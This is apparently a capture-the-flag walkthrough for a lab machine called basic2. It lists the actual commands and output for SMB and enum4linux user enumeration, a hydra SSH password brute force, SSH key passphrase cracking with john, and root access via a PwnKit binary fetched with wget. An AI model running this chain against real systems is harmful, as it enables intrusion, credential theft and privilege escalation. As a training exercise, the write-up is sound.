Recon:

**nmap**
nmap -sV enables version and service detection.

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8080/tcp open  http        Apache Tomcat 9.0.7
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel


**gobuster**
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 297]
/.hta                 (Status: 403) [Size: 292]
/.htpasswd            (Status: 403) [Size: 297]
/development          (Status: 301) [Size: 320] [--> http://10.10.126.203/development/]
/index.html           (Status: 200) [Size: 158]
/server-status        (Status: 403) [Size: 301]
Progress: 4614 / 4615 (99.98%)


Vulnerabilities: SSH, SMB


Two ways to find the Users:
**smbclient**
smbclient //10.10.126.203/Anonymous -N  (logged in as anonymous)
Inside there is a staff.txt file with the names of the users.

**Enum4linux**
enum4linux -a 10.10.126.203
S-1-22-1-1000 Unix User\kay (Local User)                                                                                          
S-1-22-1-1001 Unix User\jan (Local User)

Users: jan and kay




Gaining Access:

**hydra**
Using hydra to brute force jan's account through ssh, using rockyou.txt 
hydra -l jan -P /usr/share/wordlists/rockyou.txt 10.10.126.203 ssh
[22][ssh] host: 10.10.126.203   login: jan   password: armando


Now we get into jan's ssh account:
ssh jan@10.10.126.203  

jan@basic2:~$ cd ..
jan@basic2:/home$ ls
jan  kay
jan@basic2:/home$ cd kay
jan@basic2:/home/kay$ ls
pass.bak
jan@basic2:/home/kay$ ls -la
total 48
drwxr-xr-x 5 kay  kay  4096 Apr 23  2018 .
drwxr-xr-x 4 root root 4096 Apr 19  2018 ..
-rw------- 1 kay  kay   785 May  5 11:57 .bash_history
-rw-r--r-- 1 kay  kay   220 Apr 17  2018 .bash_logout
-rw-r--r-- 1 kay  kay  3771 Apr 17  2018 .bashrc
drwx------ 2 kay  kay  4096 Apr 17  2018 .cache
-rw------- 1 root kay   119 Apr 23  2018 .lesshst
drwxrwxr-x 2 kay  kay  4096 Apr 23  2018 .nano
-rw------- 1 kay  kay    57 Apr 23  2018 pass.bak
-rw-r--r-- 1 kay  kay   655 Apr 17  2018 .profile
drwxr-xr-x 2 kay  kay  4096 Apr 23  2018 .ssh
-rw-r--r-- 1 kay  kay     0 Apr 17  2018 .sudo_as_admin_successful
-rw------- 1 root kay   538 Apr 23  2018 .viminfo




Now I'm going to use Linpeas for privilege escalation. Linpeas detects multiple privilege escalation vectors at once 

scp linpeas.sh jan@10.10.126.203:/tmp
Explained:
scp	- Secure copy â€” used to transfer files over SSH
linpeas.sh	The local file you want to send
jan@10.10.126.203	The user and IP of the remote machine
:/tmp	The target directory on the remote machine

Now we run it:
./linpeas.sh

In LinPEAS, red text is used to highlight high-risk or high-importance findings, these are areas that might lead directly to privilege escalation.

I found a RSA private key in /home/kay/.ssh/id_rsa

Now we run the command:
ssh -i rsa kay@10.10.126.203
Enter passphrase for key 'rsa': 


Now we can use JohnTheRipper, more specifically ssh2john. 
ssh2john converts SSH private keys into a format John can understand.
So now we use this command: ssh2john rsa > rsajohn.txt     

Then: john rsajohn.txt --wordlist=/usr/share/wordlists/rockyou.txt
We use rockyou.txt as the wordlist and we get:
beeswax          (rsa)

We have our password for kay, now we can go back and login.

kay@basic2:~$ 
kay@basic2:~$ ls
pass.bak
kay@basic2:~$ cat pass.bak 
heresareallystrongpasswordthatfollowsthepasswordpolicy$$


------------


Now, I also tried another exploit: [CVE-2016-5195] dirtycow
But after a lot of tries and lots of compability issues I couldn't use it to gain root access.

I realised I was compiling on Kali Linux and that's why it wasn't working. 
So, I tried pwnkit and I finally got it to work with the right compiled version.

I downloaded this: 
wget https://github.com/ly4k/PwnKit/raw/main/PwnKit -O pwnkit

Then gave it executable rights:
chmod +x pwnkit

And put it into the machine:
scp pwnkit jan@10.10.126.203:/tmp

Then:
jan@basic2:/tmp$ chmod +x /tmp/pwnkit
jan@basic2:/tmp$ ./pwnkit 
root@basic2:/tmp# whoami
root
root@basic2:/tmp# 












